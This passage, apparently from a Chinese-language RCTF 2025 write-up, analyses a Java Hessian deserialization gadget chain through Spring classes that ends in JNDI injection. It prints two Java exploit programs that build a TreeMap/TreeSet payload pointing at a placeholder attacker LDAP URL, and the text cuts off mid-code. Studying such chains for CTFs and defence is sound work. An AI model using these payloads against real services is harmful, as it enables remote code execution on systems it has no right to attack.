data-flex-basis=352px></p><p>然后我们去ysomap看一下这里链子怎么实现的</p><p><img src=/p/2025rctfwp/image-20251118194336442_hu_5226715db074b462.webp width=1024 height=677 srcset="/p/2025rctfwp/image-20251118194336442_hu_99a21f95555bb4d.webp 480w, /p/2025rctfwp/image-20251118194336442_hu_5226715db074b462.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118194336442_hu_d5c1a89ab1f01d81.webp data-full-width=1265 data-full-height=836 loading=lazy decoding=async alt=image-20251118194336442 class=gallery-image data-flex-grow=151 data-flex-basis=363px></p><p>也就是说这里的compareTo能被TreeMap类触发，然后触发其他类的动态代理，显然是入口</p><p>接下来就是查找InvocationHandler的用法，看一下白名单里面哪些类继承了这个接口</p><p><img src=/p/2025rctfwp/image-20251118200006149_hu_6e2cd659adc2ff6c.webp width=904 height=270 srcset="/p/2025rctfwp/image-20251118200006149_hu_2cfa59c1aca6c49.webp 480w, /p/2025rctfwp/image-20251118200006149_hu_6e2cd659adc2ff6c.webp 904w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118200006149_hu_6e2cd659adc2ff6c.webp data-full-width=904 data-full-height=270 loading=lazy decoding=async alt=image-20251118200006149 class=gallery-image data-flex-grow=334 data-flex-basis=803px></p><p>分別看看这三个</p><p><img src=/p/2025rctfwp/image-20251118200440623_hu_b417b3e896157596.webp width=1024 height=664 srcset="/p/2025rctfwp/image-20251118200440623_hu_86433d362833f097.webp 480w, /p/2025rctfwp/image-20251118200440623_hu_b417b3e896157596.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118200440623_hu_89ef9af0ca041703.webp data-full-width=1102 data-full-height=715 loading=lazy decoding=async alt=image-20251118200440623 class=gallery-image data-flex-grow=154 data-flex-basis=369px></p><p>没啥用</p><p><img src=/p/2025rctfwp/image-20251118200703073_hu_80aca8440b563d19.webp width=963 height=529 srcset="/p/2025rctfwp/image-20251118200703073_hu_cebc68b59f233897.webp 480w, /p/2025rctfwp/image-20251118200703073_hu_80aca8440b563d19.webp 963w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118200703073_hu_80aca8440b563d19.webp data-full-width=963 data-full-height=529 loading=lazy decoding=async alt=image-20251118200703073 class=gallery-image data-flex-grow=182 data-flex-basis=436px></p><p>跟进去其实有个toString方法，不过后续利用还是个问题</p><p>最后看<code>ObjectFactoryDelegatingInvocationHandler</code></p><p><img src=/p/2025rctfwp/image-20251118200801342_hu_7afe19c9a007d3b5.webp width=1024 height=643 srcset="/p/2025rctfwp/image-20251118200801342_hu_8209353c0db9411.webp 480w, /p/2025rctfwp/image-20251118200801342_hu_7afe19c9a007d3b5.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118200801342_hu_7e5a216ef4e15d8.webp data-full-width=1175 data-full-height=738 loading=lazy decoding=async alt=image-20251118200801342 class=gallery-image data-flex-grow=159 data-flex-basis=382px></p><p>invoke方法里面的objetFactory可控，可以调用getObject方法</p><p>接下来就是找能用的objectFactory类</p><p><img src=/p/2025rctfwp/image-20251118201426215_hu_c505351c2cd94c2.webp width=940 height=347 srcset="/p/2025rctfwp/image-20251118201426215_hu_9e5a6770528292a5.webp 480w, /p/2025rctfwp/image-20251118201426215_hu_c505351c2cd94c2.webp 940w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118201426215_hu_c505351c2cd94c2.webp data-full-width=940 data-full-height=347 loading=lazy decoding=async alt=image-20251118201426215 class=gallery-image data-flex-grow=270 data-flex-basis=650px></p><p><img src=/p/2025rctfwp/image-20251118201443825_hu_529e7d8c3bc510bb.webp width=1024 height=583 srcset="/p/2025rctfwp/image-20251118201443825_hu_342284cbb47a2729.webp 480w, /p/2025rctfwp/image-20251118201443825_hu_529e7d8c3bc510bb.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118201443825_hu_e6897ef5c28a7d24.webp data-full-width=1148 data-full-height=654 loading=lazy decoding=async alt=image-20251118201443825 class=gallery-image data-flex-grow=175 data-flex-basis=421px></p><p>显然可以用，它的getObject可以调用getBean方法，而且其中的参数都可控</p><p>接下来找符合条件的BeanFactory,翻找beans包下面没有可用的，查找jndi包的</p><p><img src=/p/2025rctfwp/image-20251118202633050_hu_663d59be55adb90d.webp width=963 height=521 srcset="/p/2025rctfwp/image-20251118202633050_hu_9c0860cd6a343e23.webp 480w, /p/2025rctfwp/image-20251118202633050_hu_663d59be55adb90d.webp 963w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118202633050_hu_663d59be55adb90d.webp data-full-width=963 data-full-height=521 loading=lazy decoding=async alt=image-20251118202633050 class=gallery-image data-flex-grow=184 data-flex-basis=443px></p><p>查看它的getBean方法</p><p><img src=/p/2025rctfwp/image-20251118202818536_hu_92eb5fae7d1509a2.webp width=1024 height=603 srcset="/p/2025rctfwp/image-20251118202818536_hu_f2354508585a788b.webp 480w, /p/2025rctfwp/image-20251118202818536_hu_92eb5fae7d1509a2.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251118202818536_hu_82a42c8ea884a6f8.webp data-full-width=1176 data-full-height=693 loading=lazy decoding=async alt=image-20251118202818536 class=gallery-image data-flex-grow=169 data-flex-basis=407px></p><p>那还说啥了，这里可以JNDI注入</p><p>接下来就是搓poc环节</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.ysomap.ReflectionHelper</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.rctf.server.tool.Maybe</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>sun.misc.Unsafe</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.TreeMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.TreeSet</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>exp3</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>theUnsafe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Unsafe</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;theUnsafe&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>theUnsafe</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Unsafe</span><span class=w> </span><span class=n>unsafe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Unsafe</span><span class=p>)</span><span class=w> </span><span class=n>theUnsafe</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SimpleJndiBeanFactory</span><span class=w> </span><span class=n>factory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SimpleJndiBeanFactory</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>c1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>o1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>allocateInstance</span><span class=p>(</span><span class=n>c1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unsafe</span><span class=p>.</span><span class=na>getAndSetObject</span><span class=p>(</span><span class=n>o1</span><span class=p>,</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>objectFieldOffset</span><span class=p>(</span><span class=n>c1</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;beanFactory&#34;</span><span class=p>)),</span><span class=w> </span><span class=n>factory</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>jndiUrl</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ldap://xxx:xxxx&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unsafe</span><span class=p>.</span><span class=na>getAndSetObject</span><span class=p>(</span><span class=n>o1</span><span class=p>,</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>objectFieldOffset</span><span class=p>(</span><span class=n>c1</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;targetBeanName&#34;</span><span class=p>)),</span><span class=w> </span><span class=n>jndiUrl</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>o2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>allocateInstance</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>objectFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafe</span><span class=p>.</span><span class=na>objectFieldOffset</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class=p>).</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;objectFactory&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unsafe</span><span class=p>.</span><span class=na>getAndSetObject</span><span class=p>(</span><span class=n>o2</span><span class=p>,</span><span class=w> </span><span class=n>objectFactory</span><span class=p>,</span><span class=w> </span><span class=n>o1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Maybe</span><span class=w> </span><span class=n>maybe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Maybe</span><span class=p>(</span><span class=n>o2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreeSet</span><span class=w> </span><span class=n>treeSet</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>makeTreeSet</span><span class=p>(</span><span class=n>maybe</span><span class=p>,</span><span class=w> </span><span class=n>maybe</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>serialize</span><span class=w> </span><span class=o>=</span><span class=w>  </span><span class=n>HessianFactory</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>treeSet</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HessianFactory</span><span class=p>.</span><span class=na>deserialize</span><span class=p>(</span><span class=n>serialize</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>TreeSet</span><span class=w> </span><span class=nf>makeTreeSet</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>v2</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreeMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>m</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TreeMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ReflectionHelper</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=w> </span><span class=s>&#34;size&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ReflectionHelper</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=w> </span><span class=s>&#34;modCount&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>nodeC</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.util.TreeMap$Entry&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=w> </span><span class=n>nodeCons</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeC</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>nodeC</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>node</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>right</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nodeCons</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>node</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ReflectionHelper</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>node</span><span class=p>,</span><span class=w> </span><span class=s>&#34;right&#34;</span><span class=p>,</span><span class=w> </span><span class=n>right</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ReflectionHelper</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>m</span><span class=p>,</span><span class=w> </span><span class=s>&#34;root&#34;</span><span class=p>,</span><span class=w> </span><span class=n>node</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreeSet</span><span class=w> </span><span class=n>set</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TreeSet</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ReflectionHelper</span><span class=p>.</span><span class=na>setFieldValue</span><span class=p>(</span><span class=n>set</span><span class=p>,</span><span class=w> </span><span class=s>&#34;m&#34;</span><span class=p>,</span><span class=w> </span><span class=n>m</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>set</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>其实就是从后往前构造，先将SimpleJndiBeanFactory和jndi的恶意url填入TargetBeanObjectFactory的两个属性，然后传给ObjectFactoryDelegatingInvocationHandler的objectFactory，最后作为InvocationHandler传入到maybe这个类的代理，最外面套一个TreeMap触发，这里这个<code>makeTreeSet</code>函数是搬ysoMap里面的</p><p><img src=/p/2025rctfwp/image-20251119192934440_hu_56ce6af9ce55dec9.webp width=1024 height=620 srcset="/p/2025rctfwp/image-20251119192934440_hu_b0c985fb0df0c.webp 480w, /p/2025rctfwp/image-20251119192934440_hu_56ce6af9ce55dec9.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/2025rctfwp/image-20251119192934440_hu_e5bc5be3dfe0570.webp data-full-width=1504 data-full-height=910 loading=lazy decoding=async alt=image-20251119192934440 class=gallery-image data-flex-grow=165 data-flex-basis=396px></p><p>当然这题也可以将url先放在SimpleJndiBeanFactory里面一块传给TargetBeanObjectFactory，同时这题是jdk8,也可以考虑不用unsafe反射</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.beans.factory.BeanFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.beans.factory.ObjectFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.jndi.support.SimpleJndiBeanFactory</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.InvocationHandler</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.TreeMap</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.rctf.server.tool.Maybe</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>exp4</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Throwable</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SimpleJndiBeanFactory</span><span class=w> </span><span class=n>factory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SimpleJndiBeanFactory</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;ldap://xxx:xxxx&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//可以在这一步设置url</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>factory</span><span class=p>.</span><span class=na>setShareableResources</span><span class=p>(</span><span class=n>url</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>c1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>constructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>c1</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>BeanFactory</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectFactory</span><span class=w> </span><span class=n>objectFactory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>)</span><span class=w> </span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>factory</span><span class=p>,</span><span class=w> </span><span class=n>url</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>c2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>constructor2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>c2</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>ObjectFactory</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>constructor2</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>invocationHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>constructor2</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>objectFactory</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Maybe</span><span class=w> </span><span class=n>maybe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Maybe</span><span class=p>(</span><span class=n>invocationHandler</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//其实这下面用优先队列那个compare也能触发，或者直接用TreeMap包装就行</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TreeMap</span><span class=w> </span><span class=n>treeMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TreeMap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>treeMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>maybe</span><span class=p>,</span><span class=n>maybe</span><span class=p>);</span><span class=w>
